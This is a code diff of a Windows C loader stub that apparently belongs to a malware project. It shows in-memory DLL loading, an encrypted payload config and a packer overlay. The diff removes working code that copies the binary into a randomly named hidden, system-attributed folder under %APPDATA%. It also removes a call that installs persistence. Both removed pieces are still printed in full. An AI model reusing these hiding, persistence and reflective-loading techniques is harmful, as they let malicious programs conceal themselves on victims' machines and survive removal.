@@ -25,7 +25,6 @@
 #include <stdio.h>
 #include <stddef.h>
 #include <tlhelp32.h>
-#include "persistence.h"
 #include "plugin.h"
 #include "crypto.h"
 // Prototype for plugin loader (implemented in plugin_loader.c)
@@ -78,57 +77,6 @@ void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
         bytes[i] = (unsigned char)(v & 0xFF);
     }
 }
-
-// Function to create hidden binary in %APPDATA%
-BOOL create_hidden_binary(char *hidden_binary, size_t hidden_binary_size, const char *bin_path, const char *bin_name) {
-    char appdata[PATH_BUF_LEN];
-    if (!GetEnvironmentVariableA("APPDATA", appdata, PATH_BUF_LEN)) {
-        return FALSE;
-    }
-
-    char rand_str[9];
-    snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
-    char search_path[PATH_BUF_LEN];
-    snprintf(search_path, PATH_BUF_LEN, "%s\\.*", appdata);
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(search_path, &findData);
-    int dot_folder_count = 0;
-    char existing_folder[PATH_BUF_LEN] = "";
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                if (strncmp(findData.cFileName, ".", 1) == 0 && strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
-                    dot_folder_count++;
-                    if (dot_folder_count == 1) {
-                        snprintf(existing_folder, PATH_BUF_LEN, "%s\\%s", appdata, findData.cFileName);
-                    }
-                }
-            }
-        } while (FindNextFileA(hFind, &findData));
-        FindClose(hFind);
-    }
-
-    char hidden_folder[PATH_BUF_LEN];
-    if (dot_folder_count >= 2 && strlen(existing_folder) > 0) {
-        strncpy(hidden_folder, existing_folder, PATH_BUF_LEN);
-    } else {
-        snprintf(hidden_folder, PATH_BUF_LEN, "%s\\.%.8s", appdata, rand_str);
-        if (!CreateDirectoryA(hidden_folder, NULL)) {
-            return FALSE;
-        }
-    }
-    SetFileAttributesA(hidden_folder, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
-    snprintf(hidden_binary, hidden_binary_size, "%s\\%s", hidden_folder, bin_name);
-    if (!CopyFileA(bin_path, hidden_binary, FALSE)) {
-        return FALSE;
-    }
-    SetFileAttributesA(hidden_binary, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
-    return TRUE;
-}
-
-/* persistence handled by platform backend in persistence_win.c */
 
 HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size) {
     if (!dll_data || dll_size < sizeof(IMAGE_DOS_HEADER)) {
@@ -410,12 +358,6 @@ int main(int argc, char *argv[]) {
         write_debug("config payload_size exceeds stored length");
         ret = 1;
         goto cleanup;
-    }
-
-    {
-        PersistenceOpts opts = {0};
-        opts.type = (PersistenceType)config->persistence;
-        create_persistence(&opts);
     }
 
     // Attempt to load any appended plugins (packer may have appended an encrypted overlay).
